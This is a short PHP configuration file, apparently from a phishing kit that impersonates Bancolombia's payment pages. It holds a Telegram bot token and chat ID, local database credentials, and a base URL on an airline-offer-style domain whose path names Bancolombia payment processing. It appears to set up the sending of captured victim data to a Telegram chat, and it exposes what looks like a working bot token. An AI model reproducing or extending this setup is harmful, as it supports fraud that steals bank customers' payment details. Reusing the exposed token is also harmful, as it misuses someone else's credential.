<?php
// Credenciales para Telegram y la base de datos
return [
    'telegram' => [
        'bot_token' => '8310315205:AAEDfY0nwuSeC_G6l2hXzbRY2xzvAHNJYvQ', // Reemplaza con el token de tu bot
        'chat_id' => '-4875193224',            // Reemplaza con el ID del grupo o chat
    ],
    'db' => [
            'host' => 'localhost',
            'dbname' => 'lux',
            'user' => 'root',       // Cambia esto por tu usuario de MySQL
            'password' => '',       // Cambia esto por tu contraseña de MySQL
    ],
    'base_url' => 'https://vuelaflashofertas.online/pago/bancolombia/proceso/process/funtions/actualizar-estado.php'
];
